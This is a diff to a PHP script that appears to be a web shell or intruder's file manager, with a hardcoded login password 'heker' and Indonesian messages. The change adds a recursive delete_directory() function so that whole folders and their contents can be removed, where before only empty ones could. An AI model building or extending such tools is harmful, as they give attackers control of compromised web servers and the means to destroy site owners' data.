@@ -2,7 +2,7 @@
 error_reporting(E_ALL);
 set_time_limit(0);
 session_start();
-$LOGIN_PASS = 'heker'; // ganti sesuai keinginan
+$LOGIN_PASS = 'heker'; // ganti password
 if (isset($_GET['logout'])) {
     $_SESSION = array();
     session_destroy();
@@ -331,6 +331,17 @@ function file_ext($file) {
     return $ext ? $ext : '-';
 }
 
+function delete_directory($dir) {
+    if (!file_exists($dir)) return true;
+    if (!is_dir($dir)) return unlink($dir);
+    
+    foreach (scandir($dir) as $item) {
+        if ($item == '.' || $item == '..') continue;
+        if (!delete_directory($dir . DIRECTORY_SEPARATOR . $item)) return false;
+    }
+    return rmdir($dir);
+}
+
 function fgroup_name($file) {
     $gid = @filegroup($file);
     if ($gid === false) return '-';
@@ -442,8 +453,8 @@ if (isset($_POST['action'])) {
                 if (@unlink($target)) $msg = 'File berhasil dihapus';
                 else $msg = 'Gagal hapus file';
             } elseif (@is_dir($target)) {
-                if (@rmdir($target)) $msg = 'Folder kosong berhasil dihapus';
-                else $msg = 'Gagal hapus folder (harus kosong)';
+                if (delete_directory($target)) $msg = 'Folder beserta isinya berhasil dihapus';
+                else $msg = 'Gagal hapus folder (periksa permission)';
             }
         }
         $cwd_real = $path_real;
